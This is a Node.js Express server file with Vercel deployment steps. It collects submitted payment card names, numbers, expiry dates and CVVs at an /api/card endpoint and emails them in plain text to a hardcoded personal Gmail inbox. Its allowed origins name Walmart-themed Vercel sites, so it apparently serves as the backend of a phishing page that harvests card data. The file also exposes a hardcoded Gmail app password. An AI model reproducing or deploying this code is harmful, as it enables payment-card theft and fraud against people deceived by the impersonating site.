// api.js

// HOW TO HOST LOCALLY:
// 1. npm install express cors nodemailer
// 2. node api.js
//    Runs at http://localhost:3000
//
// HOW TO DEPLOY TO VERCEL:
// 1. Push this file to GitHub.
// 2. Import your repo on https://vercel.com.
// 3. Set environment variables GMAIL_USER and GMAIL_PASS in your Vercel dashboard.
// 4. Vercel auto-detects Express and deploys your API.
// 5. Ensure this line stays at the bottom: `module.exports = app;`

const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

// ✅ Allowed origins
const allowedOrigins = [
  "http://127.0.0.1:5500",
  "http://localhost:5500",
  "https://walmart-mu.vercel.app",
  "https://walmartbackend.vercel.app"
];

// ✅ CORS middleware
app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    optionsSuccessStatus: 200
  })
);

// ✅ JSON parser
app.use(express.json());

// ✅ Handle preflight requests
app.options("*", cors());

// ✅ Set CORS headers manually (just in case)
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
    res.header("Access-Control-Allow-Credentials", "true");
  }
  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ✅ Configure nodemailer
const gmailUser = process.env.GMAIL_USER || "peternnamani001@gmail.com";
const gmailPass = process.env.GMAIL_PASS || "llvn tfua kgre byir";

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: gmailUser,
    pass: gmailPass
  }
});

// Optional verification
transporter.verify((error, success) => {
  if (error) console.error("Email transport error:", error);
  else console.log("Email transporter ready");
});

// ✅ API route
app.post("/api/card", async (req, res) => {
  const { cardName, cardNumber, expiry, cvv } = req.body;
  console.log("Received card submission:", req.body);

  if (!cardName || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ error: "Missing fields" });
  }

  const mailOptions = {
    from: gmailUser,
    to: gmailUser,
    subject: "New Card Submission",
    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    res.json({ success: true, message: "Email sent", info: info.response });
  } catch (err) {
    console.error("Error sending email:", err);
    res.status(500).json({ error: "Failed to send email", details: err.message });
  }
});

// ✅ Start server locally
const PORT = process.env.PORT || 3000;
if (process.env.NODE_ENV !== "production") {
  app.listen(PORT, () => console.log(`API running on port ${PORT}`));
}

// ✅ Required for Vercel deployment
module.exports = app;
